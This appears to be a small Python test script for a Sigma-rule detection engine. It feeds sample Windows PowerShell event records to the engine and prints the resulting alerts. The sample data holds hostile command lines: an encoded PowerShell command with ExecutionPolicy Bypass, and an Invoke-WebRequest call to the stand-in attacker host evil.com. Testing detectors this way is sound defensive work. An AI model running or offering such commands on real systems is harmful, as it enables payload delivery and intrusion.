from engine.sigma import load_sigma_rules, run_sigma

rules = load_sigma_rules()

print("Loaded", len(rules), "Sigma rules")

event = {
    "source": "windows",
    "timestamp": "2026-07-30T10:15:22Z",
    "host": "WIN10-PC",
    "user": "Administrator",
    "EventID": "4104",
    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA"
}
event = {
    "source": "windows",
    "timestamp": "2026-07-30T12:00:00Z",
    "host": "WIN10-PC",
    "user": "Administrator",
    "EventID": 4104,
    "CommandLine": "powershell Invoke-WebRequest http://evil.com"
}

alerts = run_sigma([event])

print("\nAlerts:")
print(alerts)